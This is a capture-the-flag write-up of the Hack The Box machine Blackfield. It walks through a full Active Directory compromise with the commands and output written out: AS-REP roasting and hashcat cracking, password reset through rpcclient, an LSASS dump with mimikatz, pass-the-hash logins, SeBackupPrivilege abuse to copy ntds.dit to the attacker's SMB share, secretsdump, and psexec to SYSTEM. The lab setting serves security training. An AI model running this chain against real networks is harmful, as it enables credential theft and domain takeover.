---
title: "HTB Writeup | Blackfield"
layout: post
---
IP: <span style="color:#40E0D0">10.10.10.192</span> <br>
Rating: <span style="color:red">Hard</span> <br>
My Rating: <span style="color:orange">Medium</span> <br>
Operating System: Windows <br>

# Overview
<hr>
<div style="text-align:justify">Enumerate SMB shares for possible usernames and attempt kerberoasting. A support account is compromised allowing for any user's password to be reset. After resetting the audit2020 password, we are able to access another SMB share and steal the Local Security Authority Subsystem Service (LSASS) file. Using the hashes dumped from the LSASS file, we login to the machine as a backup operator. From there, backup the Domain Controller and extract the Administrator hashes from the ntds.dit database file.</div>

# Recon
<hr>
Using Nmap on the box to find open ports will so we can enumerate further gives us the following ports:
```

# Nmap 7.80 scan initiated Sat Aug  8 16:34:48 2020 as: nmap -sCV -v -oN nmap/blackfield.nmap 10.10.10.192
Nmap scan report for 10.10.10.192
Host is up (0.075s latency).
Not shown: 993 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-08-09 03:40:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=8/8%Time=5F2F0C83%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h05m28s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-08-09T03:43:02
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug  8 16:38:10 2020 -- 1 IP address (1 host up) scanned in 202.45 seconds

```
Another Active Directory (AD) machine to take down. Why AD? By seeing DNS (port 53), SMB (port 139), and LDAP (port 389), we are probably dealing with an AD.
The LDAP banner confirms the domain name as 'BLACKFIELD.LOCAL'. <br>
The first thing I usually try is kerberoasting; for that, I will need valid usernames. For an explanation and exploitation of Kerberos you can check my <a href="/sauna" target="\_blank">Sauna</a> writeup.
# Enumeration
<hr>
## SMB | anonymous
Using the user anonymous and an empty password, we can list SMB shares with smbmap.
```
root@crab:~# smbmap -H 10.10.10.192 -u 'anonymous' -p ''
[+] Guest session       IP: 10.10.10.192:445    Name: 10.10.10.192                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```
The share 'profiles$' allows anonymous read access, so let’s mount it and take a peek.
```
mount -t cifs //10.10.10.192/profiles$ /mnt/blackfield/
```
Note the mode 'cifs' is for mounting Windows shares on Linux.
Listing all the files in the share displays multiple folders with what looks like usernames. It's probably set up so each user probably has their own folder.
```
root@crab:~# cd /mnt/blackfield
root@crab:/mnt/blackfield# ls                                                                                                       [6/6]
AAlleni        BGeminski       EFeatherling   IKotecky           LChippel        NSchepkie     SEulert      UPyrke
ABarteski      BLostal         EFrixione      ISantosi           LChoffin        NVanpraet     SFadrigalan  VBublavy
ABekesz        BMannise        EJenorik       JAngvall           LCominelli      OBelghazi     SGolds       VButziger
ABenzies       BNovrotsky      EKmilanovic    JBehmoiras         LDruge          OBushey       SGrifasi     VFuscca
ABiemiller     BRigiero        ElKatkowsky    JDanten     ...
```
To me, this looks like a potential user-list which is good news for Kerberoasting. I just printed the output of the 'ls' command to a file because why not?
```
root@crab:/mnt/blackfield# ls > ~/userlist.txt
root@crab:/mnt/blackfield# head ~/userlist.txt
AAlleni
ABarteski
ABekesz
ABenzies
ABiemiller
AChampken
ACheretei
ACsonaki
AHigchens
AJaquemai
...
```
Let's try some kerberoasting now.
## Kerberos
 The first thing I am going to try is checking if any account allows Kerberos pre-authentication so that we can retrieve a ticket from the Active Directory.
```
root@crab:~# GetNPUsers.py -dc-ip 10.10.10.192 BLACKFIELD.LOCAL/ -usersfile userlist.txt -no-pass
...
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$support@BLACKFIELD.LOCAL:6db92103e01883a869d0eb4f03c0bdd2$6b2c87bbd8719967ee1d030328b43a0b40a417ba77e5e811c188215de5d643194
6cdc8e0f117ce568d4a6e2be913bba150b577a1637ce0fe1278b4fa36a65858da5f164671c773872cde21985079770b16adec6a782593cd8937742e4c3d37e3c2dbf495c5
09c60c5762c123100edebd1c2825a9dfe88ccdc149cf4d2f31600904f5b57f1e556520263235e036c17e1fc33ecb689ce0921da394021f645ca064c348dabd3a1fcebc721
75b646cf146fda63edb934f669d49a4bc016c3dede902611dbfb862454d938875c650708f6501ed213b6074fd826ea6813f736caba618a71a30cb07cfd6af5b0b85037052
257c3efb60aa                                                                                                                             
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                             
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
...
```
The support account allows for Kerberos pre-authentication, we got a ticket. I am going to use hashcat to hopefully crack it. Below is an example of how to find the correct code for hashcat. We are looking for AS-REP.
```
root@crab:~# hashcat --example-hashes
...
MODE: 18200                                                                                                                              TYPE: Kerberos 5, etype 23, AS-REP
HASH: $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754
d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f438a0797dbfb2f8a1a5f4c423f9bfc1fea483342a
11bd56a216f4d5158ccc4b224b52894fadfba3957dfe4b6b8f5f9f9fe422811a314768673e0c924340b8ccb84775ce9defaa3baa0910b676ad0036d13032b0dd94e3b1390
3cc738a7b6d00b0b3c210d1f972a6c7cae9bd3c959acf7565be528fc179118f28c679f6deeee1456f0781eb8154e18e49cb27b64bf74cd7112a0ebae2102ac
PASS: hashcat
...
```
The mode to use in this case will be 18200, lets try our luck with the rockyou.txt wordlist first. Note the '--force' option is not necessary if you are not using a VM.
```
root@crab:~# hashcat -m 18200 -a 0 hashes/support /opt/wordlists/rockyou.txt --force --show
$krb5asrep$23$support@BLACKFIELD.LOCAL:6db92103e01883a869d0eb4f03c0bdd2$6b2c87bbd8719967ee1d030328b43a0b40a417ba77e5e811c188215de5d643194
6cdc8e0f117ce568d4a6e2be913bba150b577a1637ce0fe1278b4fa36a65858da5f164671c773872cde21985079770b16adec6a782593cd8937742e4c3d37e3c2dbf495c5
09c60c5762c123100edebd1c2825a9dfe88ccdc149cf4d2f31600904f5b57f1e556520263235e036c17e1fc33ecb689ce0921da394021f645ca064c348dabd3a1fcebc721
75b646cf146fda63edb934f669d49a4bc016c3dede902611dbfb862454d938875c650708f6501ed213b6074fd826ea6813f736caba618a71a30cb07cfd6af5b0b85037052
257c3efb60aa:#00^BlackKnight
```
Cracked!
```
support  ::  #00^BlackKnight
```
Unfortunately, the support user is not part of the 'Remote Management' group, so we cannot log in with evil-winrm.
```
root@crab:~# evil-winrm -i 10.10.10.192 -p '#00^BlackKnight' -u support
Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
Error: Exiting with code 1
```
Checking SMB, we have some new shares that are readable.
```
root@crab:~# smbmap -H 10.10.10.192 -u 'support' -p '#00^BlackKnight'
[+] IP: 10.10.10.192:445        Name: 10.10.10.192                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
```
Nothing too interesting. <br>
Knowing that this is a support account, it is most likely able to reset user passwords. I know rpcclient has an option for that.
## rpcclient
Logging in with the support account on rpcclient, we can use the setuserinfo2 command to reset an accounts password. The syntax can be found <a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/" target="\_blank">here</a>. <br>
Which account shall we reset is the question. Looking at the SMB shares again, notice the 'forensic' share comment says it's 'Audit share'. Lets grep the user list for the word audit.
```
root@crab:~# grep audit userlist.txt
audit2020
```
That's probably it. If it isn't, I'm sure the Administrator doesn't mind us resetting another user password.
```
root@crab:~# rpcclient -U support 10.10.10.192
Enter support's password:
rpcclient $> setuserinfo2 audit2020 23 'password1234!@'
rpcclient $>
```
No errors, let's test it out. First things first, evil-winrm.
```
root@crab:~# evil-winrm -i 10.10.10.192 -u audit2020 -p 'password1234!@'

Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
Error: Exiting with code 1
```
No luck, let's check what SMB shares are available now.
```
root@crab:~# smbmap -H 10.10.10.192 -u audit2020 -p 'password1234!@'
[+] IP: 10.10.10.192:445        Name: 10.10.10.192                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
```
Just like we predicted the 'forensic' share we talked about earlier is now READ ONLY.
## SMB | audit2020
Forensic stuff are bound to be juicy, time to mount and dig through it.
```
root@crab:~# mount -t cifs //10.10.10.192/forensic /mnt/blackfield/ -o username=audit2020,password='password1234!@',domain=blackfield
root@crab:~# cd /mnt/blackfield/
root@crab:/mnt/blackfield# ls
commands_output  memory_analysis  tools
```
The folders 'commands_output' and 'memory_analysis' look interesting. Digging through them, I came across an eye-catching 'lsass.zip' file. LSASS, also known as Local Security Authority Subsystem Service, is basically responsible for verifying a user trying to login to Windows, creating access tokens, handling password changes, and more. A great tool called Minikatz is able to dump this file for potential hashes. Let's give it a shot. <br>
On Windows VM:
```
C:\> mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords
```

Using grep to output only NTLM hashes and the corresponding users from the Mimikatz output file, we get a lot of juicy information.
```
root@crab:~# grep -e ntlm -e user -i mimikatz.log                                                       
User Name         : svc_backup                                                                                                           
         * Username : svc_backup                                                                                                         
         * NTLM     : 9658d1d1dcd9250115e2205d9f48400d                                                                                   
         * Username : svc_backup                                                                                                         
         * Username : svc_backup                                                                                                         
User Name         : UMFD-2
         * Username : DC01$   
         * NTLM     : b624dc83a27cc29da11d9bf25efea796              
         * Username : DC01$                                         
         * Username : DC01$     
User Name         : UMFD-2      
         * Username : DC01$                                         
         * NTLM     : b624dc83a27cc29da11d9bf25efea796              
         * Username : DC01$
         * Username : DC01$
User Name         : Administrator
         * Username : Administrator
         * NTLM     : 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
         * Username : Administrator
         * Username : Administrator
User Name         : DWM-1
...

```

All that's left is to try these hashes, the Administrator one first is a good idea.

# Gaining access
<hr>
## svc_backup

```
root@crab:~# crackmapexec winrm 10.10.10.192 -u Administrator -H '7f1e4ff8c6a8e6b6fcae2d9c0572cd62'
CME          10.10.10.192:445 DC01            [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD)
CME          10.10.10.192:445 DC01            [-] BLACKFIELD\Administrator 7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE
[*] KTHXBYE!

root@crab:~# crackmapexec winrm 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
CME          10.10.10.192:445 DC01            [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD)
CME          10.10.10.192:445 DC01            [+] BLACKFIELD\svc_backup 9658d1d1dcd9250115e2205d9f48400d
[*] KTHXBYE!

```
The NTLM hash for svc_backup works with winrm! Let's get that user.txt and enum some more.
```
root@crab:~# evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> dir

    Directory: C:\Users\svc_backup\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/4/2020   9:22 PM             34 user.txt

*Evil-WinRM* PS C:\Users\svc_backup\Desktop>
```
Before mapping out the whole Active Directory with SharpHound, I like to check basic things such as the users privileges and what groups are they in.
The svc_backup user, as the name suggests, is part of the 'Backup Operators' group.
```
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> net user svc_backup
...
Last logon                   2/23/2020 11:03:50 AM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Desktop>

```

Knowing this, we can abuse the SeBackupPrivilege and create a 'copy' of the current Domain Controller (DC) state. From there, we can extract the ntds.dit database file and dump the hashes. The ntds.dit file usually stores Active Directory data including user passwords hashes. <br>
Let's get right to it.
## Administrator
We will be using diskshadow to backup the Domain Controller's current state. Luckily, the diskshadow binary is already available on the machine.
```
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> diskshadow /?
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  10/5/2020 6:20:09 PM

DISKSHADOW.EXE  [/s <scriptfile> [param1] [param2] [param3] ...] [/l <logfile>]
                          - Runs script mode
DISKSHADOW.EXE  [/l <logfile>]
                          - Interactive mode

    /s <scriptfile> [param1] [param2] [param3] ... [paramX]
                          - Script mode. Include environment parameters in script using
                            %DISKSH_PARAM_1%, %DISKSH_PARAM_2%, %DISKSH_PARAM_3%, ..., %DISKSH_PARAM_X%
                            to reference [paramX] above.
    /l <logfile>          - Output log file
```
We need to give diskshadow a script to execute:
```
Script ->{
set context persistent nowriters  
set metadata c:\windows\system32\spool\drivers\color\example.cab  
set verbose on  
begin backup  
add volume c: alias mydrive  
create  
expose %mydrive% w:  
end backup  
}
```
The /s option is for executing a script.
```
*Evil-WinRM* PS C:\Users\svc_backup\music> diskshadow /s script.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  10/5/2020 6:33:00 PM
...
```
The backup was successful, however, we cannot copy the ntds.dit file from the backup since the svc_backup account does not have permissions to access it. We have to implement some sort of backup and copy it to an accessible folder.
For that, I used the SeBackupPrivilegeCmdLets and SeBackupPrivilegeUtils powershell modules found <a href="https://github.com/giuliano108/SeBackupPrivilege">here</a>.
I already have them downloaded, so ill copy them over using SMB.
```
*Evil-WinRM* PS C:\Users\svc_backup\music> copy \\10.10.14.234\heli\SeBackupPrivilegeUtils.dll .                                         
*Evil-WinRM* PS C:\Users\svc_backup\music> copy \\10.10.14.234\heli\SeBackupPrivilegeCmdLets.dll .                                       
*Evil-WinRM* PS C:\Users\svc_backup\music> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc_backup\music> Import-Module .\SeBackupPrivilegeCmdLets.dll
```
Then copy the ntds.dit database file to our current directory using the powershell module.
```
*Evil-WinRM* PS C:\Users\svc_backup\music> Set-SeBackupPrivilege
*Evil-WinRM* PS C:\Users\svc_backup\music> Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit C:\Users\svc_backup\music\ntds.dit -Overwrite
```
And finally, we are going to need the Windows SYSTEM hive to extract anything useful from the ntds.dit file.
```

*Evil-WinRM* PS C:\Users\svc_backup\music> reg save HKLM\SYSTEM C:\Users\svc_backup\music\system.hive
The operation completed successfully.

```
I will be using Impacket's secretsdump.py to dump hashes. Let's copy the needed files back to our machine with SMB and try it.
```
*Evil-WinRM* PS C:\Users\svc_backup\music> copy ntds.dit \\10.10.14.234\heli\
*Evil-WinRM* PS C:\Users\svc_backup\music> copy system.hive \\10.10.14.234\heli\
```
A quick glance at the secretsdump.py help menu is enough to get the syntax:
```
root@crab:~# secretsdump.py -ntds ntds.dit -system system.hive LOCAL                             [63/63]
Impacket v0.9.22.dev1+20200826.101917.9485b0c2 - Copyright 2020 SecureAuth Corporation                     

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393                                                                            
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                            
[*] Searching for pekList, be patient                                                                                                    
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c                                                                        
[*] Reading and decrypting hashes from ntds.dit                                                                                          
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::                     
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                             
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:9d0d1c1498ac9ab2365fd58539624f1a:::                            
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::                            
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:4ee1e27ad931a09c93aefb549287e40f:::                        
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::                          
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
...
```
We got an Administrator hash! It is also different than the one we had before.
The best way to test it is with psexec.py:
```
root@crab:~# psexec.py BLACKFIELD.LOCAL/Administrator@10.10.10.192 -hashes 184fb5e5178480be64824d4cd53b99ee:184fb5e5178480be64824d4cd53b99ee
Impacket v0.9.22.dev1+20200826.101917.9485b0c2 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.192.....
[*] Found writable share ADMIN$
[*] Uploading file OQzoEqVP.exe
[*] Opening SVCManager on 10.10.10.192.....
[*] Creating service yppx on 10.10.10.192.....
[*] Starting service yppx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1397]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami && hostname
nt authority\system
DC0
```

Go to the Administrator's desktop and get your flag :)
# Conclusion
<hr>
A lengthy, but really cool and realistic box. The path is straightforward and educational.
